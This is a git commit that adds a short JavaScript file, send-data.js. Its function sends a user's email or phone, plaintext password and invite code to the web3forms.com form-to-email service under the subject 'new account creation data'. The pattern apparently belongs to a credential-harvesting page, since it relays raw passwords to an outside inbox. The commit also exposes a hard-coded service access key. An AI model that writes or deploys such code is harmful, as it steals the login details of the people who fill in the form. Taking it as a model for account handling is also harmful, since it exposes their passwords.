d293d94fb09c5bb9c374a7ad8a2f39b373459536
mj4433314-cmyk <mj4433314@gmail.com>
2026-07-12 19:43:48 +0300

    Create send-data.js

---
+++ send-data.js
@@ -0,0 +1,16 @@
+function sendAccountData(accountData) {
+    fetch('https://web3forms.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            access_key: 'd5623378-1590-4731-a6c1-1eebabfaeb12',
+            subject: 'بيانات إنشاء حساب جديدة',
+            email_or_phone: accountData.emailOrPhone,
+            password: accountData.password,
+            invite_code: accountData.inviteCode
+        })
+    });
+}
